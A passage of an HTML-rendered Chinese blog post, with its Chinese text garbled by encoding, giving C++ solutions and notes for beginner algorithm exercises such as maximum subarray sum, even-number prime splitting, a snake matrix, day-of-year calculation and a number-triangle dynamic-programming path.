class="keyword">else</span>&#123;</span><br><span class="line">temp = m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> maxsum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">m</span><span class="params">(n)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;m[i];</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="built_in">f</span>(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302170011890.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302170011890.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æœ€å¤§å­åºåˆ—å’Œ"><a href="#æœ€å¤§å­åºåˆ—å’Œ" class="headerlink" title="æœ€å¤§å­åºåˆ—å’Œ"></a>æœ€å¤§å­åºåˆ—å’Œ</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304144651558.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304144651558.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼šæ¯”å¦‚1 -3 7 8 -4 12 -10 6</p><ul><li>å‡å¦‚åˆ°äº†iä½ç½®ï¼Œåˆ¤æ–­è¿™ä¸ªä½ç½®è¦ä¸è¦ä¹ŸåŠ å…¥å­åºåˆ—ï¼Œå…ˆåˆ¤æ–­å‰é¢çš„å­åºåˆ—å’Œæ˜¯å¦å¤§äº0ï¼Œæ¯”å¦‚1 -3ç›¸åŠ ä¸º-2ï¼Œåˆ™ä»7å¼€å§‹ä¸€å®šæ¯”åŠ ä¸Šå‰é¢çš„åºåˆ—å’Œæ›´å¤§ã€‚å¦‚æœå‰é¢çš„å­åºåˆ—å¤§äº0ï¼Œå¦‚ 7 8 -4ï¼Œåˆ™ä½¿ç”¨å‰é¢çš„å­åºåˆ—ã€‚</li><li>å¦‚æœåºåˆ—å…¨è´Ÿï¼Œå¦‚ -3 -2 -1 -4 -5 -6 -7 -8ï¼Œåˆ™åº”è¯¥å­åºåˆ—åªåŒ…å«-1é¡¹ã€‚åˆå§‹åŒ–æœ€å¤§å­åºåˆ—å’Œä¸ºé¦–é¡¹å³å¯ï¼Œå¦‚æœåˆå§‹åŒ–ä¸º0æ— æ³•åˆ¤æ–­ä¸Šè¿°æƒ…å†µ</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æœ€å¤§å­åºåˆ—çš„å’Œ</span></span><br><span class="line"><span class="comment">//ä»å·¦åˆ°å³å¼€å§‹åŠ ï¼Œå¦‚æœå‰é¢æ‰€åŠ ä¹‹å’Œæ¯”æœ¬èº«è¿˜å°ï¼Œä¸å¦‚æ›´æ–°å­åºåˆ—ä»æœ¬èº«å¼€å§‹ã€‚è¾…åŠ©å˜é‡ï¼šå½“å‰å­åºåˆ—é¦–ä½å€ï¼Œå½“å‰æœ€å¤§å­åºåˆ—å’Œï¼Œå®é™…æœ€å¤§å­åºåˆ—å’Œï¼Œï¼Œå®é™…å­åºåˆ—å¤´ï¼Œå®é™…å­åºåˆ—å°¾ã€‚ </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> min -31457</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;m)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n=m.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> front=<span class="number">0</span>,rear=<span class="number">0</span>,tempsum=<span class="number">0</span>,sum=m[<span class="number">0</span>],tempfront=<span class="number">0</span>;<span class="comment">//åˆå§‹åŒ–å­åºåˆ—æœ€å¤§å’Œä¸ºé¦–é¡¹ </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(tempsum&gt;<span class="number">0</span>)&#123;<span class="comment">//å‰é¢å­åºåˆ—å’Œå¤§äº0ï¼Œç»§ç»­ä½¿ç”¨ </span></span><br><span class="line">tempsum += m[i];</span><br><span class="line"><span class="keyword">if</span>(tempsum &gt; sum)&#123;<span class="comment">//åŠ ä¸Šè¯¥ä½ç½®å½“å‰å­åºåˆ—å’Œå¤§äºæœ€å¤§å­åºåˆ—å’Œ </span></span><br><span class="line">front = tempfront;</span><br><span class="line">sum = tempsum;</span><br><span class="line">rear = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//å‰é¢å­åºåˆ—å’Œå°äº0 </span></span><br><span class="line">tempfront = i;<span class="comment">//æš‚å­˜åºåˆ—é¦– </span></span><br><span class="line">tempsum = m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tempsum &gt; sum)&#123;</span><br><span class="line">rear = i;</span><br><span class="line">front = i;</span><br><span class="line">sum = tempsum;</span><br><span class="line">&#125;<span class="comment">//å…¨è´Ÿæƒ…å†µï¼Œå¦‚-3 -2 -1 -4 -5 -6 -7 -8  </span></span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;front+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;rear+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">m</span><span class="params">(n)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">f</span>(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152211073.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152211073.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152235443.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304152235443.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="å¶æ•°åˆ†è§£"><a href="#å¶æ•°åˆ†è§£" class="headerlink" title="å¶æ•°åˆ†è§£"></a>å¶æ•°åˆ†è§£</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304154153903.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304154153903.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>æ ¹æ®æ•°è®ºï¼šå¦‚æœä¸€ä¸ªæ•°aä¸èƒ½è¢«ä»2åˆ°sqrt(a)æ•´é™¤ï¼Œåˆ™aä¸ºç´ æ•°</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å¶æ•°åˆ†è§£</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isPrime</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(n);i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">divise</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">bool</span> flag=<span class="literal">false</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;(n/<span class="number">2</span>+<span class="number">1</span>);i++)&#123;</span><br><span class="line"><span class="type">int</span> j=n-i;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isPrime</span>(i)&amp;&amp;<span class="built_in">isPrime</span>(j)) &#123;</span><br><span class="line">cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">divise</span>(n)) cout&lt;&lt;<span class="string">&quot;ä¸å¯åˆ†è§£&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160243142.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160243142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="è›‡å½¢çŸ©é˜µ"><a href="#è›‡å½¢çŸ©é˜µ" class="headerlink" title="è›‡å½¢çŸ©é˜µ"></a>è›‡å½¢çŸ©é˜µ</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160312122.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304160312122.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>çœ‹åˆ°è¿™ä½ éƒ½è¿˜ä¸èƒ½è‡ªå·±å†™æˆ‘åªèƒ½é€ä½ å››ä¸ªå¤§å­—ï¼Œåˆ«çœ‹äº†</p><p>å¥‡æ•°è¡Œæ­£åºï¼Œå¶æ•°è¡Œé€†åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//iä¸ºè¡Œ </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;<span class="comment">// </span></span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">2</span>)&#123;<span class="comment">//å¶æ•°è¡Œ </span></span><br><span class="line">cout&lt;&lt;n*(i+<span class="number">1</span>)-j&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cout&lt;&lt;n*i+j&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161753020.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161753020.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="è®¡ç®—ç¬¬å‡ å¤©"><a href="#è®¡ç®—ç¬¬å‡ å¤©" class="headerlink" title="è®¡ç®—ç¬¬å‡ å¤©"></a>è®¡ç®—ç¬¬å‡ å¤©</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161848661.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304161848661.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç¬¬äºŒä¸ªæ ·ä¾‹è¾“å‡ºæ˜¯é”™çš„ï¼Œåº”è¯¥æ˜¯159</p><p>è¾“å…¥æ—¥æœŸyyyy mm ddï¼Œè¾“å‡ºæ˜¯æœ¬å¹´ç¬¬å‡ å¤©ã€‚</p><blockquote><p>æœ¬é¢˜ä¸»è¦çŸ¥è¯†ç‚¹ï¼šå¹´ä»½æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ä¹‹ä¸€ä¸ºé—°å¹´ï¼Œ2æœˆæœ‰29å¤©ï¼š</p><ul><li>å¹´ä»½èƒ½è¢«4æ•´é™¤ï¼Œä¸èƒ½è¢«100æ•´é™¤</li><li>å¹´ä»½èƒ½è¢«400æ•´é™¤</li></ul></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¡ç®—ç¬¬å‡ å¤©</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isDouYear</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>((n%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;n%<span class="number">100</span>!=<span class="number">0</span>)||(n%<span class="number">400</span>==<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">whatday</span><span class="params">(<span class="type">int</span> year,<span class="type">int</span> month,<span class="type">int</span> day)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> m[<span class="number">13</span>]=&#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br><span class="line"><span class="type">int</span> sumday = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isDouYear</span>(year)) m[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;month;i++)&#123;</span><br><span class="line">sumday += m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sumday+day;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> year,month,day;</span><br><span class="line">cin&gt;&gt;year&gt;&gt;month&gt;&gt;day;</span><br><span class="line">cout&lt;&lt; <span class="built_in">whatday</span>(year,month,day);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304164607464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240304164607464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æ•°å¡”è·¯å¾„"><a href="#æ•°å¡”è·¯å¾„" class="headerlink" title="æ•°å¡”è·¯å¾„"></a>æ•°å¡”è·¯å¾„</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155323524.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155323524.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœä¸æ‡‚å¯ä»¥å…ˆçœ‹ä¸‹é¢letcodeä¸‰é“è·¯å¾„é¢˜</p><p>æ•°å¡”ä¸­(i,j)æ¥è‡ªäº(i-1,j-1),(i-1,j)ä¸­çš„æœ€å¤§å€¼ï¼Œå®šé•¿æ•°ç»„æ–¹ä¾¿ï¼Œè¿™é‡Œç”¨åŠ¨æ€æ•°ç»„</p><blockquote><p>ä¸­é—´æ’äº†ä¸€ä¸ªå¾ˆä¹…çš„é”™ï¼Œpush_backæ˜¯å‹å…¥å‘é‡ï¼Œä½†æ˜¯äº‹å…ˆå£°æ˜äº†å‘é‡ä¼šä¿å­˜ï¼Œä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n);<span class="comment">//é”™è¯¯æ¥æº</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dprow</span><span class="params">(i+<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">dprow[j]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">dp.<span class="built_in">push_back</span>(dprow);</span><br><span class="line">&#125;<span class="comment">//å®šä¹‰dpæ•°ç»„ </span></span><br></pre></td></tr></table></figure><p>å£°æ˜dpæ•°ç»„æ—¶æ”¾å…¥nä¸ªå‘é‡ï¼Œç„¶ådp.push_backçš„å‘é‡æ˜¯åœ¨nä¸ªå‘é‡ä¹‹åã€‚åº”è¯¥ç›´æ¥<code>vector&lt;vector&lt;int&gt;&gt; dp;</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¸‰è§’å½¢æœ€å°è·¯å¾„å’Œ </span></span><br><span class="line"><span class="comment">//push_backå‘vectoré‡Œå‹å…¥å‘é‡ ï¼Œæ¯è¡Œç¬¬ä¸€ä¸ªåªèƒ½æ¥è‡ªä¸Šä¸€è¡Œç¬¬ä¸€ä¸ªï¼Œæ¯è¡Œæœ€åä¸€ä¸ªåªèƒ½æ¥è‡ªä¸Šä¸€è¡Œæœ€åä¸€ä¸ªã€‚ </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxpath</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;m)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = m.<span class="built_in">size</span>();</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dprow</span><span class="params">(i+<span class="number">1</span>)</span></span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">dprow[j]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">dp.<span class="built_in">push_back</span>(dprow);</span><br><span class="line">&#125;<span class="comment">//å®šä¹‰dpæ•°ç»„ </span></span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>]=m[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>) dp[i][<span class="number">0</span>]=m[i][<span class="number">0</span>]+dp[i<span class="number">-1</span>][<span class="number">0</span>];<span class="comment">//æ•°å¡”æœ€å·¦è¾¹åªæ¥è‡ªä¸Šé¢çš„æœ€å·¦è¾¹</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(j==i) dp[i][j]=m[i][j]+dp[i<span class="number">-1</span>][j<span class="number">-1</span>];<span class="comment">//åŒç†ï¼Œæœ€å³è¾¹æ¥è‡ªä¸Šé¢æœ€å³è¾¹</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+m[i][j];<span class="comment">//(i,j)æ¥è‡ªäº(i-1,j-1),(i-1,j)ä¸­çš„æœ€å¤§å€¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout&lt;&lt;dp[i][j]&lt;&lt;&quot; &quot;;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> maxest=dp[n<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[n<span class="number">-1</span>][i]&gt;maxest)&#123;</span><br><span class="line">maxest = dp[n<span class="number">-1</span>][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> maxest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;<span class="comment">//è¡Œæ•°</span></span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; m; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">row</span><span class="params">(i+<span class="number">1</span>)</span></span>;<span class="comment">//æ¯è¡Œi+1ä¸ªå…ƒç´  </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=i;j++)&#123;</span><br><span class="line">cin&gt;&gt;row[j];</span><br><span class="line">&#125;</span><br><span class="line">m.<span class="built_in">push_back</span>(row);<span class="comment">//å‘é‡å‹æ ˆ</span></span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="built_in">maxpath</span>(m);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155720759.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240305155720759.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="å­—ç¬¦ç»Ÿè®¡"><a 